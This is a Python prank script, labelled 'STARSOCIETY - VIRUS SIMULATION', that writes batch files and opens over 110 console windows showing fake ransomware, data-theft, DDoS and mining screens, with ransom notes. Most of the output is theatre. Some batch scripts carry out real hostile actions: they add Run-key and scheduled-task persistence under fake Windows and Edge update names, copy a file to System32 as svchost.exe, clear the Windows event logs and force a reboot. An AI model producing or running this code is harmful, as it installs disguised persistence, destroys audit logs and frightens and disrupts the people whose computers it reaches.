import subprocess
import time
import os
import sys
import random
import string
import ctypes

# Пытаемся скрыть консоль (опционально)
if sys.platform == "win32":
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)

# Цвета для CMD (Windows)
COLORS = ["0a", "0b", "0c", "0d", "0e", "0f", "1a", "2a", "3a", "4a"]

def random_string(length=10):
    """Генерирует случайную строку"""
    return ''.join(random.choices(string.ascii_letters + string.digits, k=length))

def create_temp_script(content, name="temp_script"):
    """Создаёт временный bat файл"""
    filename = f"{name}_{random_string(5)}.bat"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write(content)
    return filename

def open_window(title, command, color=None):
    """Открывает новое окно cmd с командой"""
    if color is None:
        color = random.choice(COLORS)
    full_cmd = f'start "{title}" cmd /k "color {color} && title {title} && {command}"'
    subprocess.Popen(full_cmd, shell=True)

# ========== 1. МАТРИЧНЫЙ ЭФФЕКТ ==========
def create_matrix_script():
    """Создаёт скрипт матричного эффекта"""
    return '''@echo off
color 0a
mode con cols=80 lines=25
:matrix
set chars=01
set /a rnd=%random% %% 2
if %rnd%==0 (color 0a) else (color 0c)
for /l %%i in (1,1,80) do (
    set /a char=%random% %% 3
    if !char!==0 (echo|set /p="0") else (echo|set /p="1")
)
echo.
goto matrix
'''

# ========== 2. ФЕЙКОВОЕ ШИФРОВАНИЕ ==========
def create_encrypt_script():
    """Создаёт скрипт имитации шифрования"""
    return '''@echo off
color 0c
title ENCRYPTING FILES...
echo [*] Initializing ransomware module...
timeout /t 1 > nul
echo [*] Searching for documents...
for /l %%i in (1,1,50) do (
    echo [>] Scanning file %%i of 10000...
    timeout /t 0.05 > nul
)
echo [*] Found 1247 personal files!
timeout /t 1 > nul
echo [*] Starting encryption...
for /l %%i in (1,1,100) do (
    echo [>] Encrypting file %%i of 100...
    timeout /t 0.1 > nul
)
echo [!] ENCRYPTION COMPLETE [!]
echo.
echo Your files have been locked!
echo Send 1 BTC to: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa
echo.
echo [WARNING] Do not close this window!
pause
'''

# ========== 3. СБОР ДАННЫХ ==========
def create_data_steal_script():
    """Создаёт скрипт имитации кражи данных"""
    return '''@echo off
color 0b
title DATA EXFILTRATION...
echo [*] Connecting to C2 server...
timeout /t 1 > nul
echo [*] Connection established: 185.130.5.253:4444
timeout /t 1 > nul
echo [*] Collecting system information...
echo [!] Computer Name: %COMPUTERNAME%
echo [!] Username: %USERNAME%
echo [!] OS Version: %OS%
timeout /t 2 > nul
echo [*] Dumping browser passwords...
for /l %%i in (1,1,20) do (
    echo [>] Extracting password %%i...
    timeout /t 0.1 > nul
)
echo [+] Found: admin@facebook.com:password123
echo [+] Found: user@gmail.com:qwerty2024
echo [+] Found: root@localhost:toor
timeout /t 2 > nul
echo [*] Uploading to remote server...
for /l %%i in (1,1,100) do (
    echo [>] Uploading... %%i%%
    timeout /t 0.02 > nul
)
echo [✓] Data sent successfully!
pause
'''

# ========== 4. DOS АТАКА (симуляция) ==========
def create_dos_script():
    """Создаёт скрипт имитации DDoS атаки"""
    return '''@echo off
color 0d
title DDOS ATTACK - TARGET: GOVERNMENT
echo [*] Loading attack tools...
timeout /t 1 > nul
echo [*] Target IP: 185.165.29.101
echo [*] Target Port: 443
echo [*] Attack type: UDP FLOOD + SYN FLOOD
timeout /t 1 > nul
echo.
echo [!] LAUNCHING ATTACK [!]
echo.
set /a packets=0
:attack
set /a packets+=1
echo [>] Packet %packets% sent to 185.165.29.101:443
if %packets%==100 goto done
timeout /t 0.01 > nul
goto attack
:done
echo.
echo [✓] Attack completed! 100 packets sent.
echo [+] Target seems vulnerable!
pause
'''

# ========== 5. ПЕРСИСТЕНТНОСТЬ ==========
def create_persistence_script():
    """Создаёт скрипт добавления в автозагрузку"""
    return '''@echo off
color 0e
title INSTALLING PERSISTENCE...
echo [*] Gaining administrator privileges...
timeout /t 1 > nul
echo [*] Modifying registry...
reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "WindowsUpdate" /t REG_SZ /d "%windir%\\system32\\cmd.exe /c start_starsociety.bat" /f > nul 2>&1
echo [+] Registry key created!
timeout /t 1 > nul
echo [*] Creating scheduled task...
schtasks /create /tn "MicrosoftEdgeUpdateTask" /tr "cmd.exe /c start_starsociety.bat" /sc daily /st 00:00 /f > nul 2>&1
echo [+] Scheduled task created!
timeout /t 1 > nul
echo [*] Copying payload to system32...
copy "%~f0" "%windir%\\System32\\drivers\\svchost.exe" > nul 2>&1
echo [+] Payload installed!
timeout /t 1 > nul
echo [!] PERSISTENCE ESTABLISHED [!]
echo This system is now under remote control.
pause
'''

# ========== 6. СЕТЕВОЕ СКАНИРОВАНИЕ ==========
def create_network_scan_script():
    """Создаёт скрипт сетевого сканирования"""
    return '''@echo off
color 0f
title NETWORK INTRUSION...
echo [*] Scanning local network...
for /l %%i in (1,1,254) do (
    echo [>] Scanning 192.168.1.%%i...
    timeout /t 0.02 > nul
)
echo [*] Hosts found:
echo [+] 192.168.1.1 - Router (TP-Link)
echo [+] 192.168.1.24 - Windows PC (SECURITY_CAM)
echo [+] 192.168.1.56 - NAS Storage
echo [+] 192.168.1.99 - Smart TV
echo [+] 192.168.1.105 - Android Phone
timeout /t 2 > nul
echo [*] Attempting exploitation...
echo [+] Exploiting SMB vulnerability on 192.168.1.24...
echo [+] Access granted! Opening backdoor...
net use Z: \\\\192.168.1.24\\C$ /user:Administrator "" > nul 2>&1
echo [!] Remote drive mounted as Z:
pause
'''

# ========== 7. РАЗБЛОКИРОВКА ВИНЛОККЕРА ==========
def create_winlocker_script():
    """Создаёт скрипт запуска винлоккера"""
    return '''@echo off
color 04
title STARSOCIETY - SYSTEM LOCKED
echo.
echo     ███████╗████████╗ █████╗ ██████╗ ███████╗███████╗██╗
echo     ██╔════╝╚══██╔══╝██╔══██╗██╔══██╗██╔════╝██╔════╝╚██╗
echo     ███████╗   ██║   ███████║██████╔╝███████╗█████╗   ██║
echo     ╚════██║   ██║   ██╔══██║██╔══██╗╚════██║██╔══╝   ██║
echo     ███████║   ██║   ██║  ██║██║  ██║███████║███████╗██╔╝
echo     ╚══════╝   ╚═╝   ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝ 
echo.
echo     [ SYSTEM COMPROMISED ]
echo     [ ALL FILES ENCRYPTED ]
echo     [ DO NOT TURN OFF YOUR PC ]
echo.
echo Contact: starsociety@onionmail.org
echo.
echo Press any key to continue...
pause > nul
echo Starting lock sequence...
timeout /t 2 > nul
python winlocker.py 2>nul || echo [ERROR] winlocker.py not found!
pause
'''

# ========== 8. САМОУНИЧТОЖЕНИЕ ==========
def create_self_destruct_script():
    """Создаёт скрипт самоуничтожения"""
    return '''@echo off
color 04
title SELF DESTRUCT SEQUENCE
echo [!!!] WARNING: SELF DESTRUCT INITIATED [!!!]
timeout /t 3 > nul
echo [*] Deleting system logs...
wevtutil cl System > nul 2>&1
wevtutil cl Security > nul 2>&1
wevtutil cl Application > nul 2>&1
echo [+] Logs cleared!
timeout /t 1 > nul
echo [*] Removing traces...
del /f /q *.bat > nul 2>&1
echo [+] Temporary files deleted!
timeout /t 1 > nul
echo [*] Overwriting MFT...
echo [!] Operation failed: Access Denied
timeout /t 1 > nul
echo [*] Aborting self destruct...
echo [✓] SELF DESTRUCT CANCELLED
echo This script will now exit.
timeout /t 2 > nul
'''

# ========== 9. КРИПТО-МАЙНИНГ (СИМУЛЯЦИЯ) ==========
def create_crypto_miner_script():
    """Создаёт скрипт симуляции майнинга"""
    return '''@echo off
color 02
title CRYPTO MINER - XMRig
echo [*] Connecting to mining pool...
timeout /t 1 > nul
echo [*] Pool: pool.supportxmr.com:4444
echo [*] Wallet: 48U8R5xXxXxXxXxXxXxXxXxXxXxXxXxXxXx
timeout /t 1 > nul
echo [*] Starting miner...
echo.
set /a hashrate=0
:mine
set /a hashrate=%random% %% 10000 + 1000
set /a valid=%random% %% 100
echo [>] Hashrate: %hashrate% H/s | Shares: %valid% valid
timeout /t 0.5 > nul
goto mine
'''

# ========== 10. ПСИХОЛОГИЧЕСКОЕ ВОЗДЕЙСТВИЕ ==========
def create_scare_script():
    """Создаёт скрипт с пугающими сообщениями"""
    return '''@echo off
color 04
title !!! SYSTEM BREACH !!!
mode con cols=100 lines=30
echo.
echo     ╔══════════════════════════════════════════════════════════════╗
echo     ║                                                              ║
echo     ║        !!! YOUR SYSTEM HAS BEEN COMPROMISED !!!             ║
echo     ║                                                              ║
echo     ║     All your personal data has been uploaded to our         ║
echo     ║     secure server. Your files are encrypted with AES-256    ║
echo     ║     military grade encryption.                              ║
echo     ║                                                              ║
echo     ║     To decrypt your files, send 500 USD in Bitcoin to:      ║
echo     ║     bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh              ║
echo     ║                                                              ║
echo     ║     You have 72 hours to pay. After that, your data         ║
echo     ║     will be leaked publicly and destroyed.                  ║
echo     ║                                                              ║
echo     ║     Do not attempt to remove this malware. Your system      ║
echo     ║     is under our full control.                              ║
echo     ║                                                              ║
echo     ╚══════════════════════════════════════════════════════════════╝
echo.
echo Press any key to continue...
pause > nul
echo.
echo [*] Launching additional payloads...
timeout /t 2 > nul
'''

# ========== 11. ПЕРЕЗАГРУЗКА ==========
def create_reboot_script():
    """Создаёт скрипт перезагрузки"""
    return '''@echo off
color 0c
title EMERGENCY SHUTDOWN
echo [!] CRITICAL SYSTEM ERROR [!]
echo.
echo The system has detected a critical failure.
echo To prevent data loss, Windows will restart in 30 seconds.
echo.
echo [WARNING] Do not interrupt the restart process!
echo.
timeout /t 30 > nul
echo [!] REBOOTING SYSTEM NOW [!]
shutdown /r /t 0
'''

# ========== ЗАПУСК ВСЕХ ОКОН ==========
def main():
    print("=" * 60)
    print("    STARSOCIETY - VIRUS SIMULATION")
    print("=" * 60)
    print("\n[!] WARNING: This will open 110+ windows!")
    print("[!] Last window will REBOOT your computer!")
    print("\nPress Ctrl+C within 5 seconds to cancel...")
    
    try:
        time.sleep(5)
    except KeyboardInterrupt:
        print("\n[✓] Cancelled!")
        return
    
    print("\n[*] Starting attack sequence...")
    time.sleep(1)
    
    # Создаём временные скрипты
    scripts = {
        "matrix": create_matrix_script(),
        "encrypt": create_encrypt_script(),
        "data_steal": create_data_steal_script(),
        "dos": create_dos_script(),
        "persistence": create_persistence_script(),
        "network": create_network_scan_script(),
        "winlocker": create_winlocker_script(),
        "self_destruct": create_self_destruct_script(),
        "crypto_miner": create_crypto_miner_script(),
        "scare": create_scare_script(),
        "reboot": create_reboot_script()
    }
    
    script_files = {}
    for name, content in scripts.items():
        script_files[name] = create_temp_script(content, f"starsociety_{name}")
    
    # 10 окон матрицы
    print("[1/11] Opening 10 MATRIX windows...")
    for i in range(10):
        open_window(f"MATRIX_{i+1}", f'call "{script_files["matrix"]}"')
        time.sleep(0.2)
    
    # 10 окон шифрования
    print("[2/11] Opening 10 ENCRYPTION windows...")
    for i in range(10):
        open_window(f"ENCRYPT_{i+1}", f'call "{script_files["encrypt"]}"', "0c")
        time.sleep(0.2)
    
    # 10 окон кражи данных
    print("[3/11] Opening 10 DATA STEAL windows...")
    for i in range(10):
        open_window(f"STEAL_{i+1}", f'call "{script_files["data_steal"]}"', "0b")
        time.sleep(0.2)
    
    # 10 окон DDoS
    print("[4/11] Opening 10 DDOS windows...")
    for i in range(10):
        open_window(f"DDOS_{i+1}", f'call "{script_files["dos"]}"', "0d")
        time.sleep(0.2)
    
    # 10 окон персистентности
    print("[5/11] Opening 10 PERSISTENCE windows...")
    for i in range(10):
        open_window(f"PERSIST_{i+1}", f'call "{script_files["persistence"]}"', "0e")
        time.sleep(0.2)
    
    # 10 окон сетевого сканирования
    print("[6/11] Opening 10 NETWORK SCAN windows...")
    for i in range(10):
        open_window(f"NETSCAN_{i+1}", f'call "{script_files["network"]}"', "0f")
        time.sleep(0.2)
    
    # 10 окон винлоккера (но с разными эффектами)
    print("[7/11] Opening 10 WINLOCKER windows...")
    for i in range(10):
        open_window(f"LOCK_{i+1}", f'call "{script_files["winlocker"]}"', "04")
        time.sleep(0.2)
    
    # 10 окон самоуничтожения
    print("[8/11] Opening 10 SELF DESTRUCT windows...")
    for i in range(10):
        open_window(f"DESTROY_{i+1}", f'call "{script_files["self_destruct"]}"', "04")
        time.sleep(0.2)
    
    # 10 окон криптомайнера
    print("[9/11] Opening 10 CRYPTO MINER windows...")
    for i in range(10):
        open_window(f"MINER_{i+1}", f'call "{script_files["crypto_miner"]}"', "02")
        time.sleep(0.2)
    
    # 10 окон с психологическим воздействием
    print("[10/11] Opening 10 SCARE windows...")
    for i in range(10):
        open_window(f"SCARE_{i+1}", f'call "{script_files["scare"]}"', "04")
        time.sleep(0.2)
    
    # Последнее окно - перезагрузка
    print("[11/11] Opening REBOOT window...")
    time.sleep(2)
    open_window("REBOOT", f'call "{script_files["reboot"]}"', "0c")
    
    print("\n[✓] Attack complete! 110+ windows opened!")
    print("[!] Computer will restart when the reboot window timer ends!")
    print("\nPress Enter to exit...")
    input()

if __name__ == "__main__":
    try:
        main()
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(5)
